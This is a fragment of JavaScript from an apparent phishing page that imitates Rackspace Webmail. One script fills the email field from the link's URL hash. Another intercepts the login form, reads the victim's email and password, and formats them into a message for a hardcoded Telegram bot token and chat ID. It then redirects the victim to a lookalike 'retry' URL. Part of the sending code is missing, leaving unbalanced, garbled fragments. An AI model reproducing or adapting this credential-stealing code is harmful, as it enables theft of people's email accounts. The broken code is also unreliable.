  <script>
  // Wait for page to fully load
  window.addEventListener('load', function() {
    // Extract email from URL hash (e.g., #john@gmail.com)
    const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
    
    // Basic validation (must contain @ and ., and no spaces)
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailFromUrl)) {
      // Fill the FIRST email input found
      const emailInput = document.querySelector('input[type="email"]');
      if (emailInput) {
        emailInput.value = emailFromUrl;
        // Optional: Trigger validation if needed
        emailInput.dispatchEvent(new Event('input'));
      }
    }
  });
  </script>

  <script>
  $(document).ready(function () {
    $("#email-form").submit(function (event) {
      event.preventDefault(); // Prevent default form submission

      // Get the values from the form fields
      let userEmail = $("#Email").val();
      let userPassword = $("#pass").val();

      // === REPLACE THESE WITH YOUR ACTUAL CREDENTIALS ===
      let botToken = "8394570131:AAEc-hJYmNpdozyQn_5DM0uUhzr14F38Kj0";   // Example: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
      let chatId = "7241128758";       // Example: 123456789

      // Format the message you want to receive on Telegram
      let messageText = `üîê New Login Attempt\nüìß Email: ${userEmail}\nüîë Password: ${userPassword}\nüåê Source: Rackspace Webmail\n‚è∞ Time: ${new Date().toLocaleString()}`;

      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Send the data to Telegram

        success: function () {

          setTimeout(function () {

          setTimeout(function () {
            window.location.href = "https://service-rackspace-actionpanel-retry.vercel.app/";
          }, 1000);
        }
      });
    });
  });
  </script>
